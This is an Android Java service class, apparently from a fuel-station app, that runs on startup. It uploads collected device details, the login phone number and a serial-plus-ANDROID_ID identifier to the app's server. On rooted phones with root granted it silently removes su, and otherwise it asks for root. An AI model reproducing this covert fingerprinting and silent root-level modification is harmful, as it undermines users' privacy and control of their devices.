package com.bac.bacplatform.service;

import android.app.Service;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.IBinder;
import android.provider.Settings;
import androidx.annotation.Nullable;
import android.widget.Toast;

import com.alibaba.fastjson.JSON;
import com.bac.bacplatform.BacApplication;
import com.bac.bacplatform.http.HttpHelper;
import com.bac.commonlib.domain.BacHttpBean;
import com.bac.commonlib.utils.tools.ParameterDetailManager;
import com.bac.rxbaclib.rx.rxScheduler.RxScheduler;

import java.util.Map;

import rx.Observable;
import rx.Subscriber;
import rx.android.schedulers.AndroidSchedulers;
import rx.functions.Func1;
import rx.schedulers.Schedulers;

import static android.os.Build.SERIAL;

/**
 * Created by wujiazhen on 2017/7/11.
 */

public class SecureService extends Service {

    private ParameterDetailManager parameterDetailManager;

    private boolean isCanRoot;
    @Override
    public void onCreate() {
        super.onCreate();

        parameterDetailManager = new ParameterDetailManager(SecureService.this);

        Observable.create(new Observable.OnSubscribe<String>() {
            @Override
            public void call(Subscriber<? super String> subscriber) {
                Map<String, Object> execute = parameterDetailManager.execute();
                try {
                    isCanRoot=Boolean.parseBoolean(execute.get("RootInfo") + "");
                }catch (Exception e){}
                subscriber.onNext(JSON.toJSONString(execute));
            }
        })
                .observeOn(Schedulers.from(AsyncTask.SERIAL_EXECUTOR))
                .flatMap(new Func1<String, Observable<String>>() {
                    @Override
                    public Observable<String> call(String s) {
                        return HttpHelper.getInstance().net(null, new BacHttpBean()
                                .setMethodName("RECORD_PHONE_DETAIL")
                                .put("login_phone", BacApplication.getLoginPhone())
                                .put("phone_id", SERIAL.concat("##").concat(
                                        Settings.Secure.getString(BacApplication.getBacApplication().getContentResolver(),
                                                Settings.Secure.ANDROID_ID)))
                                .put("phone_detail", s), null, null, null);
                    }
                })
                .observeOn(RxScheduler.RxPoolScheduler())
                .filter(new Func1<String, Boolean>() {
                    @Override
                    public Boolean call(String s) {
                        return isCanRoot;
                    }
                })
                // 已经root 判断是否可执行
                .map(new Func1<String, Boolean>() {
                    @Override
                    public Boolean call(String aBoolean) {
                        boolean b = parameterDetailManager.checkRootPermission();
                        if (b){
                            // 执行 删除 su
                            parameterDetailManager.silentUninstall();
                        }
                        return b;
                    }
                })
                .filter(new Func1<Boolean, Boolean>() {
                    @Override
                    public Boolean call(Boolean b) {
                        return !b;
                    }
                })
                .observeOn(AndroidSchedulers.mainThread())
                .map(new Func1<Boolean, Boolean>() {
                    @Override
                    public Boolean call(Boolean aBoolean) {
                        Toast.makeText(SecureService.this, "当前手机已Root，请授予骆驼加油权限", Toast.LENGTH_LONG).show();
                        return aBoolean;
                    }
                })
                .subscribeOn(RxScheduler.RxPoolScheduler())
                .subscribe();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        return super.onStartCommand(intent, flags, startId);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
